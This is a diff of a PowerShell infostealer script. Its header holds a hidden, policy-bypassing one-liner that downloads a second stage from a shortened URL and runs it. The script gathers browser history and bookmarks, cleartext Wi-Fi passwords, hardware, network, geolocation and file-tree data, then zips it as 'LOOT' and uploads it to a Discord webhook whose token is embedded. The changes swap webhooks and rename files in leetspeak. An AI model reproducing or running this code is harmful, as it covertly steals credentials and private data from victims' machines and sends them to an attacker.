@@ -5,7 +5,7 @@ Stage2_test url :
                     https://rb.gy/vk584t
 
 Invoke powershell + stage 2 into it + be furtive : 
-powershell -w h -NoP -Ep Bypass -Command "& {Set-Variable -Name DiscordUrl -Value 'https://discord.com/api/webhooks/1199773516900352161/k8dAsA1xT4os6JLC8WstxzDyrhnmw2R2UrdT3AxcYWbifQppCDgAO9q3zcLY0756svJy'; irm https://rb.gy/vk584t | iex}"
+powershell -w h -NoP -Ep Bypass -Command "& {Set-Variable -Name DiscordUrl -Value 'https://discord.com/api/webhooks/1202715994599194644/35p9c2sHbvO5uP6bOFON-N_pq1nginAUJASiEpOcyIeqHgiqIrtkgBy1ROAx_RZOae8t'; irm https://rb.gy/vk584t | iex}"
 
 #>
 # Function to handle the temporary directory
@@ -57,17 +57,17 @@ function ZipAndUploadToDiscord {
     $username = $env:username
 
     # Specify the date format for the archive name
-    $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'-mm"
+    $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'mm"
 
     # Specify the destination zip file path with username and date
-    $zipFileName = "${username}_Exfiltration_${dateSansHeure}.zip"
+    $zipFileName = "${username}_LOOT_${dateSansHeure}.zip"
     $zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
 
     # Compress the contents of the source directory to a zip file
     Compress-Archive -Path $sourceDirectory -DestinationPath $zipFilePath
 
     # Call Upload-Discord to send the zip archive to Discord
-    Upload-Discord -file $zipFilePath -text "Exfiltration Archive :"
+    Upload-Discord -file $zipFilePath -text "Treasure :"
 
     # Cleanup: Remove the zip file
     Remove-Item -Path $zipFilePath -Force
@@ -97,11 +97,11 @@ function Exfiltration {
     HardwareInfo
 
     #Call GrabBrowserData
-    GrabBrowserData -Browser "edge" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
-    GrabBrowserData -Browser "edge" -DataType "bookmarks" | Out-File -Append -FilePath "BrowserData.txt"
-    GrabBrowserData -Browser "chrome" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
-    GrabBrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath "BrowserData.txt"
-    GrabBrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
+    GrabBrowserData -Browser "edge" -DataType "history" | Out-File -Append -FilePath "Br0ws3r_d4t4.txt"
+    GrabBrowserData -Browser "edge" -DataType "bookmarks" | Out-File -Append -FilePath "Br0ws3r_d4t4.txt"
+    GrabBrowserData -Browser "chrome" -DataType "history" | Out-File -Append -FilePath "Br0ws3r_d4t4.txt"
+    GrabBrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath "Br0ws3r_d4t4.txt"
+    GrabBrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "Br0ws3r_d4t4.txt"
 
     #Call ZipAndUploadToDiscord
     ZipAndUploadToDiscord
@@ -121,10 +121,10 @@ function Wifi {
     # Exporte les profils Wi-Fi
     netsh wlan export profile key=clear
 
-    # Modifie les chemins dans le fichier et sauvegarde le résultat dans Wifi_Passwords.txt
+    # Modifie les chemins dans le fichier et sauvegarde le résultat dans W1f1_pr0f1les.txt
     Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
         $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
-    } | Out-File -FilePath "Wifi_Passwords.txt" -Encoding utf8
+    } | Out-File -FilePath "W1f1_pr0f1les.txt" -Encoding utf8
 
     # Retourne au dossier temporaire C:\temp
     Set-Location -Path "C:\temp"
@@ -137,8 +137,8 @@ function Wifi {
 
 # Function to get storage and directory tree information
 function StorageAndTreeInfo {
-    # Create or clear the Storage_Info.txt file
-    $storageFilePath = "C:\Temp\Storage_Info.txt"
+    # Create or clear the St0r4ge_1nf0.txt file
+    $storageFilePath = "C:\Temp\St0r4ge_1nf0.txt"
     Set-Content -Path $storageFilePath -Value $null
 
     # Collect information about hard drives
@@ -150,7 +150,7 @@ function StorageAndTreeInfo {
     # Add separator line
     Add-Content -Path $storageFilePath -Value "------------------------------------------------------------------------------------------------------------------------------`n"
 
-    # Run the 'tree' command and append the output to Storage_Info.txt
+    # Run the 'tree' command and append the output to St0r4ge_1nf0.txt
     tree $Env:userprofile /a /f | Out-File -FilePath $storageFilePath -Append -Encoding utf8
 }
 
@@ -256,7 +256,7 @@ function NetworkInfo {
     } | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 
 
     # Output to a text file
-    $networkInfoPath = Join-Path $env:TEMP "NetworkInfo.txt"
+    $networkInfoPath = Join-Path $env:TEMP "n3tw0rk_1nf0.txt"
     @(
         "Geo-Location Information:",
         "    Latitude: $Lat",
@@ -412,8 +412,8 @@ $($networkAdapters | Format-Table | Out-String)
 
 "@
 
-    # Save the output to Hardware_Info.txt
-    $HardwareInfoPath = "C:\temp\Hardware_Info.txt"
+    # Save the output to h4rdw4re_1nf0.txt
+    $HardwareInfoPath = "C:\temp\h4rdw4re_1nf0.txt"
     $output | Out-File -FilePath $HardwareInfoPath -Encoding utf8
 
 }
